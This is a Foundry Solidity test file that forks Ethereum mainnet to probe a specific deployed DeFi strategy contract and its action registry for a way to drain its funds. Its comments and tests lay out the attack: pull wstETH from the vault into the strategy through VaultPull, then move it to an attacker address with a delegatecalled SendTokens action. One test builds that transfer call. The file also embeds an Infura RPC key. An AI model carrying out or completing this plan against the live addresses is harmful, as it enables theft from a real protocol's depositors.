// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IActionRegistry {
    function getAddr(bytes4 _id) external view returns (address);
    function getIds(address _addr) external view returns (bytes4[] memory);
}

contract SendTokenExploit is Test {
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant aWstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;

    // DeFiSaver registry addresses - need to find the correct one
    address constant DEFISAVER_REGISTRY = 0x2F111C1Fa4dE9bC6B26c4D0F232c605c81e6EA27;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_FindSendTokenAction() public view {
        console.log("=== FINDING SEND TOKEN ACTION ===\n");

        // DeFiSaver SendToken action ID variations
        bytes4[] memory possibleIds = new bytes4[](10);
        possibleIds[0] = bytes4(keccak256("SendToken"));
        possibleIds[1] = bytes4(keccak256("SendTokens"));
        possibleIds[2] = bytes4(keccak256("SendErc20"));
        possibleIds[3] = bytes4(keccak256("TransferToken"));
        possibleIds[4] = bytes4(keccak256("Transfer"));
        possibleIds[5] = bytes4(keccak256("TokenSend"));
        possibleIds[6] = bytes4(keccak256("PullToken"));
        possibleIds[7] = bytes4(keccak256("WrapEth"));
        possibleIds[8] = bytes4(keccak256("UnwrapEth"));
        possibleIds[9] = bytes4(keccak256("SendTokenAndUnwrap"));

        string[10] memory names = [
            "SendToken",
            "SendTokens",
            "SendErc20",
            "TransferToken",
            "Transfer",
            "TokenSend",
            "PullToken",
            "WrapEth",
            "UnwrapEth",
            "SendTokenAndUnwrap"
        ];

        console.log("Checking action IDs:");
        for (uint i = 0; i < possibleIds.length; i++) {
            console.log(names[i], ":");
            console.logBytes4(possibleIds[i]);
        }

        // Try DeFiSaver registry
        console.log("\nTrying to query DeFiSaver registry...");
        (bool success, bytes memory data) = DEFISAVER_REGISTRY.staticcall(
            abi.encodeWithSignature("getAddr(bytes4)", possibleIds[0])
        );
        if (success && data.length == 32) {
            address actionAddr = abi.decode(data, (address));
            console.log("SendToken action address:", actionAddr);
        }
    }

    function test_BruteForceActionRegistry() public view {
        console.log("=== BRUTE FORCE ACTION REGISTRY ===\n");

        // The known action addresses from our investigation
        address[] memory knownActions = new address[](13);
        knownActions[0] = 0xbdFb29cCD82dB3ccf462F3CB600892b2E6f185C7;
        knownActions[1] = 0x160F1f3a512Fa7cCefA0eb08f881282c05d6eb0f;
        knownActions[2] = 0xb8cD2bA2A0Ada353aE15398618Fafb1d7BD558C5;
        knownActions[3] = 0x3e34E0694204e462Deaf8EBbeEE2bE9F887f3C3b;
        knownActions[4] = 0x99eAe56224EA5Bcb2c886D0a07154217b7A1E5d1;
        knownActions[5] = 0x819Bdb303e224CaC4aC14Da17a1ec13895869b65;
        knownActions[6] = 0x3503152722beeE269E9B4E0921F2c3D44C90d2b5;
        knownActions[7] = 0xEE1F8dc0135EE9dC2e00fac3817b9C530d34B6ba;
        knownActions[8] = 0x71f4d0A74b7F1BB07cc767dC2f4b436E907476DC;
        knownActions[9] = 0x0039d822156FF2FD28ac6e19A518660890fcD2E0;
        knownActions[10] = 0x313Ca6136521D22A7Ea763B3566Ed0B53F5B3AB9;
        knownActions[11] = 0xc780112305ED959CEEeb0DE692E2407E4145Fc3A;
        knownActions[12] = 0x351dd4581d61BCE7101FDf5f6864D510021c7CaB;

        // For each action, try to get its action type/ID
        for (uint i = 0; i < knownActions.length; i++) {
            console.log("--- Action", i, "---");
            console.log("Address:", knownActions[i]);

            // Try actionType()
            (bool success, bytes memory data) = knownActions[i].staticcall(
                abi.encodeWithSignature("actionType()")
            );
            if (success) {
                uint8 actionType = abi.decode(data, (uint8));
                console.log("  actionType:", actionType);
            }

            // Try ID()
            (success, data) = knownActions[i].staticcall(
                abi.encodeWithSignature("ID()")
            );
            if (success) {
                bytes4 id = abi.decode(data, (bytes4));
                console.log("  ID:");
                console.logBytes4(id);
            }

            // Try name()
            (success, data) = knownActions[i].staticcall(
                abi.encodeWithSignature("name()")
            );
            if (success && data.length > 0) {
                string memory name = abi.decode(data, (string));
                console.log("  name:", name);
            }
        }
    }

    function test_AnalyzeUnknownActions() public view {
        console.log("=== ANALYZING UNKNOWN ACTIONS ===\n");

        // These are the actions we haven't identified yet
        address[] memory unknownActions = new address[](3);
        unknownActions[0] = 0x3e34E0694204e462Deaf8EBbeEE2bE9F887f3C3b;
        unknownActions[1] = 0x99eAe56224EA5Bcb2c886D0a07154217b7A1E5d1;
        unknownActions[2] = 0x819Bdb303e224CaC4aC14Da17a1ec13895869b65;

        for (uint i = 0; i < unknownActions.length; i++) {
            console.log("=== Unknown Action ===");
            console.log("Index:", i);
            console.log("Address:", unknownActions[i]);

            bytes memory code = unknownActions[i].code;
            console.log("Code size:", code.length);

            // Count different call types
            uint256 delegatecallCount = 0;
            uint256 callCount = 0;
            uint256 staticcallCount = 0;

            for (uint j = 0; j < code.length; j++) {
                if (uint8(code[j]) == 0xf4) delegatecallCount++;
                if (uint8(code[j]) == 0xf1) callCount++;
                if (uint8(code[j]) == 0xfa) staticcallCount++;
            }

            console.log("DELEGATECALL:", delegatecallCount);
            console.log("CALL:", callCount);
            console.log("STATICCALL:", staticcallCount);

            // Check first 4 bytes for common selectors
            if (code.length >= 4) {
                bytes4 firstSelector = bytes4(bytes.concat(code[0], code[1], code[2], code[3]));
                console.log("First 4 bytes:");
                console.logBytes4(firstSelector);
            }
        }
    }

    function test_CheckLastThreeActions() public view {
        console.log("=== CHECKING LAST THREE UNKNOWN ACTIONS ===\n");

        // These might be the interesting ones
        address action11 = 0xc780112305ED959CEEeb0DE692E2407E4145Fc3A;
        address action12 = 0x351dd4581d61BCE7101FDf5f6864D510021c7CaB;
        address action10 = 0x313Ca6136521D22A7Ea763B3566Ed0B53F5B3AB9; // VaultPull

        console.log("Action 11:", action11);
        console.log("Code size:", action11.code.length);

        console.log("\nAction 12:", action12);
        console.log("Code size:", action12.code.length);

        // Check if these have any interesting interface
        address[] memory actions = new address[](2);
        actions[0] = action11;
        actions[1] = action12;

        for (uint i = 0; i < actions.length; i++) {
            console.log("\n--- Action", i == 0 ? "11" : "12", "---");

            (bool success, bytes memory data) = actions[i].staticcall(
                abi.encodeWithSignature("actionType()")
            );
            if (success) {
                uint8 actionType = abi.decode(data, (uint8));
                console.log("  actionType:", actionType);
            }

            (success, data) = actions[i].staticcall(
                abi.encodeWithSignature("executeActionDirect(bytes)")
            );
            console.log("  Has executeActionDirect:", success);

            // Try to decode executeAction signature
            bytes memory code = actions[i].code;

            // Look for SSTORE opcode (0x55) which indicates state modification
            uint256 sstoreCount = 0;
            for (uint j = 0; j < code.length; j++) {
                if (uint8(code[j]) == 0x55) sstoreCount++;
            }
            console.log("  SSTORE opcodes:", sstoreCount);
        }
    }

    function test_ExploitViaDelegatecallWithdraw() public {
        console.log("=== EXPLOIT VIA DELEGATECALL WITHDRAW ===\n");

        // If we can find an action that does:
        // IERC20(token).transfer(to, amount)
        // And runs in Strategy's context (via delegatecall)
        // Then `address(this)` = Strategy, so transfer would use Strategy's balance!

        // Let's check if any action does a direct transfer
        console.log("In delegatecall context:");
        console.log("  address(this) = Strategy = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943");
        console.log("  Strategy aWstETH:", IERC20(aWstETH).balanceOf(STRATEGY_0) / 1e18);
        console.log("  Strategy wstETH:", IERC20(wstETH).balanceOf(STRATEGY_0) / 1e18);

        // If an action calls IERC20(token).transfer(attacker, amount)
        // In delegatecall context, this transfers from Strategy!
    }

    function test_CheckSafeTransferAction() public {
        console.log("=== CHECKING FOR SAFE TRANSFER ACTIONS ===\n");

        // DeFiSaver might have a SendTokens action
        // Typical ID: bytes4(keccak256("SendTokens"))

        vm.startPrank(attacker);

        bytes4 sendTokensId = bytes4(keccak256("SendTokens"));
        console.log("SendTokens ID:");
        console.logBytes4(sendTokensId);

        // Try to call via ActionExecutor (simulated)
        // The executeAction function takes: (bytes calldata _callData, uint8[] memory _paramMapping, bytes32[] memory _returnValues)

        // For SendTokens, typical params are: (address token, address to, uint256 amount)
        bytes memory sendParams = abi.encode(
            wstETH,     // token
            attacker,   // to
            1e18        // amount
        );

        // Construct the action call
        // First 4 bytes = action ID
        bytes memory actionCall = abi.encodePacked(sendTokensId, sendParams);

        console.log("\nAction call constructed");
        console.log("If this action exists and is registered, it could transfer tokens");

        vm.stopPrank();
    }

    function test_AnalyzeVaultPullSource() public view {
        console.log("=== VAULT PULL SOURCE ANALYSIS ===\n");

        // VaultPull action
        address vaultPull = 0x313Ca6136521D22A7Ea763B3566Ed0B53F5B3AB9;

        // The VaultPull does:
        // 1. IStrategy(msg.sender).vault() to get vault address
        // 2. IVaultWithdrawer(vault).withdraw(token, amount)
        // 3. Tokens go to the caller (Strategy in delegatecall context)

        console.log("VaultPull behavior:");
        console.log("1. Gets vault from msg.sender.vault()");
        console.log("2. Calls vault.withdraw(token, amount)");
        console.log("3. Tokens are received by address(this) = Strategy");

        // The withdrawn tokens go to Strategy
        // We need another action to transfer OUT of Strategy

        console.log("\nTo drain, we need:");
        console.log("1. VaultPull - get wstETH into Strategy");
        console.log("2. SendTokens (or similar) - transfer wstETH to attacker");
    }
}
